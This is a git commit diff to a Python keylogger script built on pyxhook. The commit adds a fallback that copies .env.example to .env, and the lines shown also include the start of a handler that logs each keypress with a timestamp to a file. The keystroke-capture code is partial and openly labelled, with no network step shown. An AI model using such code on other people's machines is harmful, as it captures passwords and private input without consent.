d0234ebefa35535266990fa089fe0408c0b4d8ff
Adrij Shikhar <adrijshikhar85@gmail.com>
2020-08-17 14:13:24 +0530

    fix: Fixes no .env file
    If .env file does not exists then .env.example will be copied to .env and used as it as

--- keylogger.py
+++ keylogger.py
@@ -1,17 +1,26 @@
 import pyxhook
 import datetime
 import os
+import shutil
 
 from decouple import config
 
+env_file = "./.env"
+env_file_example = "./.env.example"
+
+
+if not os.path.exists(env_file):
+    print(".env file doesn't exists. Using default config from .env.example")
+    shutil.copyfile(env_file_example, env_file)
+
 log_file = config('LOG_LOCATION')
 ascii_key_code = config('GRAVE_KEY_ASCII')
-# this function is called everytime a key is pressed.
 
 if not os.path.exists(log_file):
     os.mknod(log_file)
 
 
+# this function is called everytime a key is pressed.
 def OnKeyPress(event):
     x = datetime.datetime.now()
     data = str(x.strftime("%c")) + " : " + event.Key
